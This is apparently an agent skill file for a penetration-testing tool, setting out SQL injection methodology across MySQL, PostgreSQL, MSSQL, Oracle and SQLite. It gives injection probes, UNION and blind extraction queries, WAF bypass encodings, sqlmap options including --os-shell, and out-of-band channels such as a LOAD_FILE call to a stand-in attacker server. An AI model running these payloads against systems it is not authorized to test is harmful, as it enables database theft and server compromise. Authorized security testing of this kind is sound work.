---
name: cypher-sqli
description: SQL Injection testing methodology covering error-based, union, boolean blind, time-based blind, stacked, second-order, and out-of-band techniques across MySQL, PostgreSQL, MSSQL, Oracle, and SQLite.
version: 0.1.0
owasp: [A03:2021-Injection]
cwe: [CWE-89]
finding_types: [PARAMETER, VULN_CANDIDATE, EXPLOIT_RESULT, SECRET_LEAK, CREDENTIAL]
destructiveness: medium
tags: [web, sqli, injection, data-exfiltration]
---

# Cypher SQL Injection Skill

Use this skill when a parameter, header, cookie, or body field is suspected of reaching a SQL query.

## Detection methodology

1. Identify every input point that reaches a database query: GET/POST params, headers (User-Agent, Referer, X-Forwarded-For, Cookie), JSON/XML body fields, path segments.
2. Test each independently — param pollution can mask single-injection points.
3. Start with the least noisy probe: a single quote `'`, double quote `"`, backslash `\`, or math `1+1` vs `1+2`.
4. Map the database type from error messages, version banners, or behavioral differences.
5. Progress from error-based → union → boolean blind → time-based blind as signal degrades.

## Database fingerprinting

| Database | Fingerprint |
|----------|------------|
| MySQL   | `CONCAT('a','b')`, `@@version`, `#` comment, `/*!50000` versioned comment |
| PostgreSQL | `\|\|` concat, `current_database()`, `--` or `/*` comment, `pg_sleep(n)` |
| MSSQL   | `+` concat, `@@VERSION`, `--` comment, `WAITFOR DELAY '0:0:5'`, `xp_cmdshell` |
| Oracle  | `\|\|` concat, `v$version`, `--` comment, `dbms_pipe.receive_message(('a'),5)`, `UTL_HTTP` |
| SQLite  | `\|\|` concat, `sqlite_version()`, `--` comment, `randomblob(100000000)` for time-based |

## Union injection workflow

1. Determine column count with `ORDER BY n` or `UNION SELECT null,...,null`.
2. Find display columns by placing strings at each position.
3. Extract schema: `table_name FROM information_schema.tables WHERE table_schema=database()`.
4. Extract columns: `column_name FROM information_schema.columns WHERE table_name='target'`.
5. Concatenate target data from display columns.

## Boolean blind workflow

1. Establish true/false pages: `AND 1=1` vs `AND 1=2`.
2. Use substring/ascii to extract one character at a time: `AND ASCII(SUBSTRING((SELECT ...), N, 1)) > M`.
3. Binary search the byte value for speed.
4. Automate with sqlmap when the injection point is confirmed.

## Time-based blind workflow

1. Confirm injection with a sleep: `AND SLEEP(5)` (MySQL), `AND pg_sleep(5)` (PostgreSQL), `WAITFOR DELAY '0:0:5'` (MSSQL).
2. Use the same character extraction logic wrapped in conditional sleep.
3. When network latency is noisy, prefer boolean blind if possible.

## Out-of-Band (OOB) channels

- **MySQL**: `LOAD_FILE('\\\\attacker-server\\share\\file')` (SMB), `SELECT ... INTO OUTFILE` (needs FILE priv).
- **PostgreSQL**: `COPY ... TO PROGRAM`, `dblink`.
- **MSSQL**: `xp_dirtree`, `xp_fileexist` UNC path injection, `OPENROWSET`.
- **Oracle**: `UTL_HTTP.REQUEST`, `UTL_INADDR.get_host_name`.
- Use the project DNSLog URL (`CAIRN_DNSLOG_URL` in env) or a configured callback server for OOB confirmation.

## Second-order injection

1. Data stored now, executed later — test stored values (profile names, comments, uploaded file names).
2. After storing a payload, trigger every read path that references the stored data.
3. Payloads persist across requests; verify with unique identifiers.

## WAF / filter bypass techniques

- **Whitespace**: `/**/`, `%09`, `%0a`, `%0d`, `%0c`, backticks, parentheses.
- **Keywords**: `SeLeCt`, `%53%45%4c%45%43%54`, `SEL/**/ECT`, nested `SELSELECTECT`.
- **Comments**: Inline `/*!50000SELECT*/`, `/*!UNION*/` for MySQL, `/**/UN/**/ION/**/` for others.
- **Encoding**: Double URL-encode, hex `0x...`, char() functions, base64 where accepted.
- **Alternative operators**: `&&` for AND, `\|\|` for OR, `=` vs `LIKE` vs `REGEXP` vs `BETWEEN`.
- **Quotes**: hex encoding `0x61646d696e` for 'admin', `CHAR(97,100,109,105,110)`.

## Tool usage

- **sqlmap**: Primary automated tool. Use `--level 3 --risk 2` for moderate, `--level 5 --risk 3` for thorough.
  - `--technique=B/E/U/S/T` to narrow technique.
  - `--dbms=mysql` to reduce false positives.
  - `--os-shell` only when explicitly needed and authorized.
  - `--tamper=space2comment,randomcase,charencode` for WAF bypass.
  - Save all sqlmap output to `/mnt/project/recon/sqlmap/`.
- **Burp Suite**: Identify params with Scanner, use Repeater for manual verification.
- **Ghauri**: Alternative to sqlmap with different detection logic; useful for second opinion.

## Evidence capture

- Save the full request and response for every confirmed injection point to `/mnt/project/exploit/sqli-<param>-request.txt` and `sqli-<param>-response.txt`.
- Save sqlmap session and log to `/mnt/project/recon/sqlmap/`.
- Document the exact payload, database type, extracted data proof, and privilege context.

## Prefix examples

```text
[cypher:finding type=PARAMETER confidence=0.9 severity=medium tags=web,sqli artifacts=/mnt/project/exploit/sqli-id-probe.txt cleanup=none] The `id` parameter on GET /items returns a MySQL error with single quote, confirming SQL injection potential.
```

```text
[cypher:finding type=EXPLOIT_RESULT confidence=0.98 severity=critical tags=web,sqli artifacts=/mnt/project/exploit/sqli-id-request.txt,/mnt/project/exploit/sqli-id-response.txt,/mnt/project/recon/sqlmap/ cleanup=none] UNION-based SQLi on /items?id= extracts `users` table — 1423 rows including admin password hashes.
```

## Common false positives

- Generic error pages that echo input without SQL context.
- "WAF block" pages that look like DB errors.
- Timeout-based that conflates network latency with injection signal.
- OR 1=1 injection in search pages that would return all results anyway (use AND 1=2 as negative control).
